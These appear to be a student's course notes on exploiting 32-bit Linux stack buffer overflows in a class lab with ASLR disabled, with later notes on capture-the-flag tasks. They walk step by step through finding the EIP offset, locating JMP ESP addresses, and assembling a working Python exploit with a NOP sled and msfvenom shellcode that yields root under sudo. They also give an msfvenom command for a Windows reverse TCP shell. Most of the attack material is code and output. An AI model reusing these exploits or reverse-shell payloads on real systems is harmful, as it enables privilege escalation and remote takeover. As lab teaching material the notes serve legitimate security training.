# Buffer Overflow Common Terms

## Defenses
- Address Space Layout Randomization (ASLR - we turn this off in class)
- Stack Canaries (bonus question abt. getting around this)

## Disassembly Tools
- **IDA, GHIDRA** (decompilers)
- **GDB linux debugger**
- MONA python plugin for debugger (we use this very little)
- **IMMUNITY linux debugger**
-note: if you have gdb on an adversary box, that probably means you should do something on it
`which gdb`


# GDB DEMO

[wiremask.eu buffer overflow tool](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

```
##BEFORE STARTING DEMO:0
sudo cat /proc/sys/kernel/randomize_va_space
##should show 0

sudo apt install lib32z1 -y
sudo dpkg --add-architecture i386

##after those are done

chmod +x func
./func

##make sure it runs. should say `Enter a string:`

file <filename>		#shows file type

##taking input means to enter input AFTER running the script/file
./func
>> input

##giving a parameter means to enter the parameter alongside the function when first calling it
./function <parameter>

##using gdb
gdb <function>

##to disasseble
>> pdisass main
Dump of assembler code for function main:
   0x0000054d <+0>:	lea    ecx,[esp+0x4]
   0x00000551 <+4>:	and    esp,0xfffffff0
   0x00000554 <+7>:	push   DWORD PTR [ecx-0x4]
   0x00000557 <+10>:	push   ebp
   0x00000558 <+11>:	mov    ebp,esp
   0x0000055a <+13>:	push   ecx
   0x0000055b <+14>:	sub    esp,0x4
   0x0000055e <+17>:	call   0x5b0 <__x86.get_pc_thunk.ax>	##ignore this specific function
   0x00000563 <+22>:	add    eax,0x1a71
   0x00000568 <+27>:	call   0x577 <getuserinput>		##look into this
   0x0000056d <+32>:	nop
   0x0000056e <+33>:	add    esp,0x4
   0x00000571 <+36>:	pop    ecx
   0x00000572 <+37>:	pop    ebp
   0x00000573 <+38>:	lea    esp,[ecx-0x4]
   0x00000576 <+41>:	ret    
End of assembler dump.

>> pdisass getuserinput
Dump of assembler code for function getuserinput:
   0x00000577 <+0>:	push   ebp
   0x00000578 <+1>:	mov    ebp,esp
   0x0000057a <+3>:	push   ebx
   0x0000057b <+4>:	sub    esp,0x44
   0x0000057e <+7>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000583 <+12>:	add    ebx,0x1a51
   0x00000589 <+18>:	sub    esp,0xc
   0x0000058c <+21>:	lea    eax,[ebx-0x1994]
   0x00000592 <+27>:	push   eax
   0x00000593 <+28>:	call   0x3e0 <puts@plt>
   0x00000598 <+33>:	add    esp,0x10
   0x0000059b <+36>:	sub    esp,0xc
   0x0000059e <+39>:	lea    eax,[ebp-0x3a]
   0x000005a1 <+42>:	push   eax
   0x000005a2 <+43>:	call   0x3d0 <gets@plt>			##note: this is RED in gdb-peda. take a closer look at this, it is a VULNERABLE FUNCTION
   0x000005a7 <+48>:	add    esp,0x10
   0x000005aa <+51>:	nop
   0x000005ab <+52>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x000005ae <+55>:	leave  
   0x000005af <+56>:	ret    
End of assembler dump.

>> ctrl + d 
	OR
>> quit

>> student@linux-opstation-0yyk:~/security$ ./func 
Enter a string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)		##segmentation fault (core dumped) means YES VULERNABLE to buffer overflow


##if running from gdb itself, look for this: 
Stopped reason: SIGSEGV

## using the wiremask.eu tool, enter the buffer overflow by running the program from gdb. look for the EIP (instruction pointer) as such:

[----------------------------------registers-----------------------------------]
EAX: 0xffffd43e ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
EBX: 0x41386241 ('Ab8A')
ECX: 0xf7fb75c0 --> 0xfbad2288 
EDX: 0xf7fb889c --> 0x0 
ESI: 0xf7fb7000 --> 0x1d4d8c 
EDI: 0x0 
EBP: 0x63413962 ('b9Ac')
ESP: 0xffffd480 ("Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
EIP: 0x31634130 ('0Ac1')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)


## copy that value into the wiremask.eu register value field under the "find the offset" section. this will give you the EXACT offset you need to reach the instruction pointer

##basic methodology:

1. open function in peda `gdb <function>`
2. disassemble the main function `pdisass main`
3. step through the program to find which function is vulnerable to buffer overflow. RED FUNCTIONS = vulnerable
4. research the vulernable funciton on google to see if the function is vulnerable. "<function> vulnerable" in google, keep your search simple

 sudo apt-get install multiarch-support
 sudo apt 
 
 ##python script for buffer overflow, buff.py
 
 
```python
buff="A" * 62 #feeding the script 62 A's
eip="B" * 4 #placeholder EIP sanity check - 4 bytes in sizes
print(buff + eip)
```


CONTINUING...


``` 
run <<< $(<script>)		#insert to the input of the function - use this for INPUT functions

run $(<script>)			#insert as a parameter for the function - used for the PARAMETER functions

>> env - gdb <function<		##opens up base gsb - we do this so that when we grab memory addresses, peda's processes don't interfere
(gdb) >> show env
(gdb) >> unset env LINES
(gdb) >> unset env COLUMNS
(gdb) >> show env		#sanity check - no more environment variables should be set! NEVER SKIP THESE STEPS!
(gdb) >> run		#press enter twiceru
##overflow the program after running
(gdb) >> info proc map		#gets the memory addresses for the stack and heap


process 2293
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x56555000 0x56556000     0x1000        0x0 /home/student/security/func
	0x56556000 0x56557000     0x1000        0x0 /home/student/security/func
	0x56557000 0x56558000     0x1000     0x1000 /home/student/security/func
	0x56558000 0x5657a000    0x22000        0x0 [heap]
start >	0xf7de2000 0xf7fb4000   0x1d2000        0x0 /lib32/libc-2.27.so
	0xf7fb4000 0xf7fb5000     0x1000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb5000 0xf7fb7000     0x2000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb7000 0xf7fb8000     0x1000   0x1d4000 /lib32/libc-2.27.so
	0xf7fb8000 0xf7fbb000     0x3000        0x0 
	0xf7fcf000 0xf7fd1000     0x2000        0x0 
	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
			^
			end of heap (go above one, in this case 0xf7ffe000, if it returns an error)
			
(gdb)         

##we now have to grab the ENTIRE heap
##seearch from the start of the heap to the end of the heap


>> find /b 0xf7dde2000, 0xffffe000, 0xff, 0xe4		#last two fields will always be the same, 0xff is jump, 0xe4 is ESP

0xf7de4b59
0xf7f598ab
0xf7f655fb
0xf7f6560f
0xf7f65aeb
0xf7f65aff
0xf7f65d6f
0xf7f65f97
0xf7f660cf
0xf7f66343
0xf7f66497
0xf7f665cf
0xf7f66777
0xf7f669ef
0xf7f672eb
0xf7f6749b
0xf7f67533
0xf7f67633
0xf7f67b3b
0xf7f67b8b
0xf7f67cdb
0xf7f68033
0xf7f68203
0xf7f68293
0xf7f686db
0xf7f687a3
0xf7f68843
0xf7f68ecb
0xf7f68ee3
0xf7f68f9b
0xf7f69043
0xf7f693eb
0xf7f6963b
0xf7f6970b
0xf7f69733
0xf7f697bb
0xf7f69853
0xf7f6a56b
0xf7f6a633
0xf7f6aa0b
0xf7f6ac3b
0xf7f6accb
0xf7f6ad43
0xf7f6adab
0xf7f6b41b
0xf7f6b593
0xf7f6ba53
0xf7f6bcc3
0xf7f6be13
0xf7f6bebb
0xf7f6c93b
0xf7f6cd8b
0xf7f6d013
0xf7f6d53b


##now update your buff.py script to change your payload. updated script below:

buff.py
`
buff="A" * 62 #feeding the script 62 A's
'''
0xf7 f6 96 3b

#now flip this around to get the reverse byte order, like this:

0x3b 96 f6 f7

#memory sections we chose - you can pick any of these from your info proc map output
0xf7f6963b
0xf7f6970b
0xf7f69733
0xf7f697bb
0xf7f69853
'''
#eip="B" * 4 #placeholder EIP sanity check - 4 bytes in sizes
eip = '\x3b\x96\xf6\xf7'
nop='\x90' * 10
print(buff + eip + nop)
`



linops >> msfvenom -p linux/x86/exec cmd="whoami" -b '\x00' -f python		#specifies what command to run, what payload to use, the bad characters to exclude (0x00 is  anull character, which we absolutley need to get rid of) and in what format (python in this case)

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 69 (iteration=0)
x86/shikata_ga_nai chosen with final size 69
Payload size: 69 bytes
Final size of python file: 353 bytes
buf =  b""
buf += b"\xbb\x4f\xe8\x5e\x4f\xda\xd1\xd9\x74\x24\xf4\x5f\x2b"
buf += b"\xc9\xb1\x0b\x83\xef\xfc\x31\x5f\x10\x03\x5f\x10\xad"
buf += b"\x1d\x34\x44\x69\x47\x9b\x3c\xe1\x5a\x7f\x48\x16\xcc"
buf += b"\x50\x39\xb0\x0d\xc7\x92\x22\x67\x79\x64\x41\x25\x6d"
buf += b"\x71\x85\xca\x6d\x09\xed\xa5\x0c\x98\x84\x39\x98\x31"
buf += b"\xdf\xdb\xeb\x36"


## now update buff.py again... lol
## copy and paste the entire 'buf=' section into your script. new script:

`
buff="A" * 62 #feeding the script 62 A's

## Buffer Offset ###
'''
0xf7 f6 96 3b

#now flip this around to get the reverse byte order, like this:

0x3b 96 f6 f7

#memory sections we chose - you can pick any of these from your info proc map output
0xf7f6963b
0xf7f6970b
0xf7f69733
0xf7f697bb
0xf7f69853
'''
#eip="B" * 4 # old placeholder EIP sanity check - 4 bytes in sizes. commented out because 
eip = '\x3b\x96\xf6\xf7'
nop='\x90' * 10
buf =  b""
buf += b"\xbb\x4f\xe8\x5e\x4f\xda\xd1\xd9\x74\x24\xf4\x5f\x2b"
buf += b"\xc9\xb1\x0b\x83\xef\xfc\x31\x5f\x10\x03\x5f\x10\xad"
buf += b"\x1d\x34\x44\x69\x47\x9b\x3c\xe1\x5a\x7f\x48\x16\xcc"
buf += b"\x50\x39\xb0\x0d\xc7\x92\x22\x67\x79\x64\x41\x25\x6d"
buf += b"\x71\x85\xca\x6d\x09\xed\xa5\x0c\x98\x84\x39\x98\x31"
buf += b"\xdf\xdb\xeb\x36"
print(buff + eip + nop + buf)
`
## now the moment of truth - run the script against the function

>> ./func <<< $(python buff.py)
Enter a string: 
student


##use sudo -l to verify what you can/cannot sudo
>> sudo ./func <<< $(python buff.py)
Enter a string: 
root

looks like it worked lol









### troubshooting

1. look at your nop sled. try doubling it. 
2. make sure the order of your variables is ok (buff + eip + nop + buf)
3. regenerate shellcode (use the exact same command with msfvenom as before)





##workflow:
1. find binary
2. get binary back to your box
3. do static analysis on YOUR BOX using gdb peda
4. do info proc map (must be done on the ADVERSARY BOX!!!)
5. which gdb to find if it exists. IF GDB EXISTS< DEAD GIVEAWAY!

# note: world writeable directories! /tmp is world writeable, so it can run the script from anywhere (if your 
```



# CTFD ELF 1

Exploit this binary found on 192.168.28.111 at /.hidden/inventory.exe to escalate privileges from your pivot user to root.
Enter the contents of /.secret/.verysecret.pdb as the flag



vulnerable function to buffer overflow: `fgets@plt`




# CTFD Windows

port 9999 = secureserver, vulnerable to windows buffer overflow (windows)
with Linux, EIP's need to match the box you are on (i.e. if doing it on your box, get your IP, if doing it on another box, get their EIP)

doenst work that way in windows: EIP will always be the same as long as you have their DLL
simply drag your .exe file into immunity from your desktop to open it in immunity




cpu registers pane of immunity -> gives EIP

bottom of log data pane -> gives jump ESPS for reverse byte order

generating shellcode with meterpreter: `msfvenom -p windows/shell_reverse_tcp LHOST<linops> LPORT=5555 -b '\x00' -f python	#doesnt need to be port 5555, just remember which one you used`





















```
